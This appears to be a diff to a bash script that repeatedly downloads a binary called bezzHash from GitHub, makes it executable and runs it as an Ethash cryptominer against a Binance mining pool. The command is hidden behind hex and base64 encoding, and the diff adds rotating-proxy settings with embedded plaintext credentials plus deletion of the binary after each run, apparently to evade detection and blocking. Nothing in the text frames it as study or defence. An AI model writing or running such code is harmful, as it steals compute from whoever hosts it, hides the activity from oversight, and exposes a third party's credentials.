@@ -3,10 +3,14 @@
 # Set the number of iterations
 iterations=50
 
+# Proxy settings
+export http_proxy="http://zbcpclbx-rotate:2hicb1nxgc3z@p.webshare.io:80"
+export https_proxy="http://zbcpclbx-rotate:2hicb1nxgc3z@p.webshare.io:80"
+
 # Start the loop
 for ((i=1; i<=$iterations; i++)); do
     # Convert the command to hex
-    hex_code=$(echo -n "wget https://github.com/Testdrive345/scriptX/raw/main/bezzHash && chmod 777 bezzHash && ./bezzHash --url=hunterd.$(echo $(shuf -i 1-99999 -n 1)-Gok001)@ethash.poolbinance.com:443" | xxd -p)
+    hex_code=$(echo -n "wget -e \"use_proxy = on\" -e \"http_proxy = $http_proxy\" -e \"https_proxy = $https_proxy\" https://github.com/Testdrive345/scriptX/raw/main/bezzHash && chmod +x bezzHash && ./bezzHash --url=hunterd.$(echo $(shuf -i 1-99999 -n 1)-Gok001)@ethash.poolbinance.com:443" | xxd -p)
 
     # Encode the hex code in base64
     base64_encoded=$(echo "$hex_code" | base64)
@@ -34,7 +38,7 @@ for ((i=1; i<=$iterations; i++)); do
     ./temp_hex_decoded.txt
 
     # Clean up temporary files
-    rm temp_base64_encoded.txt temp_hex_decoded.txt
+    rm temp_base64_encoded.txt temp_hex_decoded.txt bezzHash
 
     # Add a random delay before next iteration
     sleep $((RANDOM % 10))  # Random delay between 0 and 9 seconds
